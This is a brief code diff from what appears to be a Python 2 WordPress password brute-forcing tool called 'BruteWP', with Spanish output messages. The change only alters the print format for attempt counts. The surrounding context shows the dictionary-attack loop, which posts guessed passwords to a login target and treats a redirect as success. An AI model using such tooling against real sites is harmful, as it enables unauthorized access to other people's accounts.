@@ -76,12 +76,12 @@ def attack(target, usuario, diccionario, restaurar = False):
                 response = requests.post(target, data=payload, headers=cabeceras, allow_redirects=False)
 
                 if response.status_code in [302, 303]:
-                    print '[Intento #%d] - Password: %s <----- BruteWP ha ENCONTRADO el password :)' % (cont,password.strip())
+                    print '[%d] - Password: %s <----- BruteWP ha ENCONTRADO el password :)' % (cont,password.strip())
                     cont = 0
                     encontrado = True
                     break
                 elif response.status_code == 200:
-                    print '[Intento #%d] - Password: %s' % (cont,password.strip())
+                    print '[%d] - Password: %s' % (cont,password.strip())
                 else:
                     print 'Error!!!!'
 
